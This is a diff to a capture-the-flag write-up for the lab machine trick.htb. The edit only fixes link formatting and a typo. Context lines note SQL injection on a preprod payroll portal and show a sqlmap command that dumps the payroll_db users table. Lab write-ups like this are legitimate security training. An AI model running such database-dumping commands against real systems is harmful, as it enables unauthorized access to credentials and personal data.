@@ -40,7 +40,7 @@ trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604
 
 ## SQLi
 ---
-<a href="http://preprod-payroll.trick.htb" target="_blank">http://preprod-payroll.trick.htb</a><br/>
+[http://preprod-payroll.trick.htb](http://preprod-payroll.trick.htb)  
   
 The preprod portal has a login page, which is vulnerable to SQli  
   
@@ -55,7 +55,7 @@ After trying sqlmap on various forms, the 'save deduction' form seems to be vuln
 sqlmap -r save_deductions.req --batch --threads 10 -D payroll_db -T users --dump
 ```
 ```
-tabase: payroll_db
+Database: payroll_db
 Table: users
 [1 entry]
 +----+-----------+----------------+------+---------+---------+-----------------------+------------+
